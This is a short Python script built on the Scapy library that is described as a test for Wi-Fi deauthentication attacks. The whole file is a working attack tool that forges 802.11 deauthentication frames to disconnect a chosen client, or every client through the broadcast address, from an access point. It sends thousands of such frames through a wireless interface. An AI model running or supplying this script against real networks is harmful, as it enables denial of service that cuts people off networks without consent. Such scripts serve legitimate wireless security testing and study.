#!/usr/bin/python2
# anotherik

# Script to test for Deauthentication attacks using scapy

# Supress Scapy IPv6 warning
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

import random, string, sys
from scapy.all import *

#while True:
for _ in range(20):
	broadcast = ":".join(["ff"]*6)

	ap = sys.argv[1]
        client = sys.argv[2] # change by broadcast to deauth all users
        print("Deauthing %s from %s AP" % (client,ap))

	radioTapHeader = RadioTap()
	dot11Header = Dot11(addr1 = ap, addr2 = client, addr3 = client)
	dot11Deauth = Dot11Deauth(reason=7)

	pkt = radioTapHeader / dot11Header / dot11Deauth
    
	sendp(pkt, iface=sys.argv[3], count=100)

